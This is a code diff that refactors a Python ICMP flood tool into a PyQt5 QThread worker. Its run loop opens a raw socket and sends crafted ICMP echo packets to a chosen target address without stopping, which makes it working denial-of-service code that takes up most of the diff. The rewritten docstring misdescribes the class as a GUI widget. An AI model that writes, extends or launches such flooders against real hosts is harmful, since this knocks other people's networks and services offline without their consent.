@@ -1,6 +1,6 @@
 from logging import error, warning
 from struct import pack, error as PackException
-from threading import Event, Thread, ThreadError
+from threading import ThreadError
 from time import time, sleep
 from typing import Any, Dict
 
@@ -13,12 +13,14 @@ from socket import (
     IPPROTO_ICMP
 )
 
+from PyQt5.QtCore import QThread
 
-class Flooder(Thread):
+
+class FloodingWorker(QThread):
     """
-    This class extends PyQt5.QtCore.QThread class which provides ability to launch
-    run( method ) into own thread. This class build ICMP packet (header + body)
-    and send to specified address:port.
+    This class extends PyQt5.QtWidgets.QWidget class which provides ability to build
+    and show GUI window. This class build window which contains information about
+    running flooding process.
     """
 
     def __init__(self, name: str, arguments: Dict[str, Any]):
@@ -30,7 +32,8 @@ class Flooder(Thread):
             arguments (Dict[str, Any]): The dict with target info.
 
         """
-        Thread.__init__(self, None)
+
+        QThread.__init__(self)
 
         self.address = arguments.get('address')
         self.port_number = arguments.get('port')
@@ -38,7 +41,49 @@ class Flooder(Thread):
         self.sending_delay = arguments.get('delay')
 
         self.name = name
-        self.shutdown_flag = Event()
+        self.shutdown_flag = False
+
+    def interrupt_worker(self):
+        """
+        This method interrupts current thread object.
+        """
+        self.shutdown_flag = True
+
+    def run(self):
+        """
+        This method runs with another thread to create ICMP-packet and send it
+        to specified target ip-address.
+
+        Raise:
+        PackException: throws while invoke pack() method failed.
+        KeyboardInterrupt: throws while user send SIGKILL or SIGINT signal
+            to stop all threads whose sending packets.
+
+        """
+
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
+
+        try:
+            inet_aton(self.address)
+            while not self.shutdown_flag:
+                packet = self._construct_packet()
+                sock.sendto(packet, (self.address, self.port_number))
+                sleep(self.sending_delay)
+
+        except PackException as err:
+            error(msg=f'Failed while trying pack msg: {err}')
+            warning(msg=f'The {self.name} thread has not been interrupted!')
+
+        except ThreadError as err:
+            error(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
+            warning(msg=f'The {self.name} thread has been stopped!')
+
+        except Exception as err:
+            error(msg=f'Unknown runtime error into {self.name} thread!: {err}')
+
+        finally:
+            sock.close()
+            self.terminate()
 
     def _checksum(self, message) -> int:
         """
@@ -72,38 +117,3 @@ class Flooder(Thread):
         data = pack("d", time()) + data_fmt.encode('ascii')
         header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
         return header + data
-
-    def run(self):
-        """
-        This method runs with another thread to create ICMP-packet and send it
-        to specified target ip-address.
-
-        Raise:
-        PackException: throws while invoke pack() method failed.
-        KeyboardInterrupt: throws while user send SIGKILL or SIGINT signal
-            to stop all threads whose sending packets.
-
-        """
-        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
-
-        try:
-            inet_aton(self.address)
-            while not self.shutdown_flag:
-                packet = self._construct_packet()
-                sock.sendto(packet, (self.address, self.port_number))
-                sleep(self.sending_delay)
-
-        except PackException as err:
-            error(msg=f'Failed while trying pack msg: {err}')
-            warning(msg=f'The {self.name} thread has not been interrupted!')
-
-        except ThreadError as err:
-            error(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
-            warning(msg=f'The {self.name} thread has been stopped!')
-
-        except Exception as err:
-            error(msg=f'Unknown runtime error into {self.name} thread!: {err}')
-
-        finally:
-            self.shutdown_flag.set()
-            sock.close()
